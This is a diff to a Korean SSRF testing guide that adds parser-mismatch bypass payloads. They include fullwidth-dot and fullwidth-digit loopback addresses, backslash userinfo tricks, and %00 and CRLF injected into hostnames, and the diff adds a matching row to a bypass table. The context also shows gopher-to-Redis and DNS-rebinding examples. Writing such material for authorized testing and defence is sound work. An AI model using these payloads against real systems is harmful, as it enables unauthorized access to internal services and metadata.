@@ -240,6 +240,23 @@ http://[::ffff:127.0.0.1]/
 
 `@` 앞은 userinfo, 뒤가 실제 host다. 검증 로직과 fetch 라이브러리가 서로 다른 parser를 쓰면 우회가 생긴다.
 
+위 변형이 모두 막히면, 검증기와 fetch 라이브러리가 host 문자열을 정규화하는 방식 차이를 추가로 흔든다. 한 번에 하나씩만 보낸다.
+
+```text
+http://127。0。0。1/
+http://１２７．０．０．１/
+http://127.0.0.1\@allowed.com/
+http://allowed.com\@127.0.0.1/
+http://127.0.0.1%00.allowed.com/
+http://127.0.0.1%0d%0a.allowed.com/
+```
+
+- fullwidth 마침표(`。`, `．`)나 fullwidth 숫자는 일부 정규화 단계에서 ASCII 점·숫자로 바뀌어 host가 달라진다.
+- backslash(`\`)는 브라우저·일부 라이브러리가 `/`로 취급해 userinfo·host 경계가 바뀐다.
+- `%00`, `%0d%0a`(CRLF)는 검증기가 host를 조기 종료로 읽는지, fetch 라이브러리가 뒤 문자열까지 host로 읽는지 차이를 만든다. CRLF가 요청 헤더에 그대로 반영되면 요청 분리 가능성도 함께 확인한다.
+
+같은 입력에 검증은 `allowed.com`을, 실제 요청은 내부 주소를 보도록 갈리면 parser mismatch 취약이다. 인코딩 변형만으로 판정하지 말고 실제 요청 도착지(Collaborator·내부 응답 차이)로 확인한다.
+
 ### 7. Redirect 우회
 
 검증은 최초 URL만 보고 fetcher가 redirect를 따라가면 내부 URL로 넘어갈 수 있다.
@@ -280,6 +297,7 @@ gopher://127.0.0.1:6379/_INFO%0d%0a
 | `localhost`, `127.0.0.1` 차단 | IP 변형, IPv6 | `127.1`, `2130706433`, `[::1]` |
 | 사설 IP 차단 | DNS rebinding, attacker DNS | `internal.attacker.com` → `127.0.0.1` |
 | allowlist 도메인만 허용 | userinfo, subdomain, redirect | `allowed.com@127.0.0.1`, `allowed.com.attacker.com` |
+| 점 표기·ASCII만 검사 | fullwidth·backslash·`%00`·CRLF로 parser mismatch | `１２７．０．０．１`, `allowed.com\@127.0.0.1`, `127.0.0.1%00.allowed.com` |
 | http/https만 허용 | redirect로 scheme 전환 | `https://attacker/302-to-file` |
 | 응답 본문 미노출 | status/time/length 비교 | 내부 포트별 timeout 차이 |
 | metadata 차단 | redirect, IPv6/alias, header 제어 확인 | IMDSv2 token/header 가능 여부 |
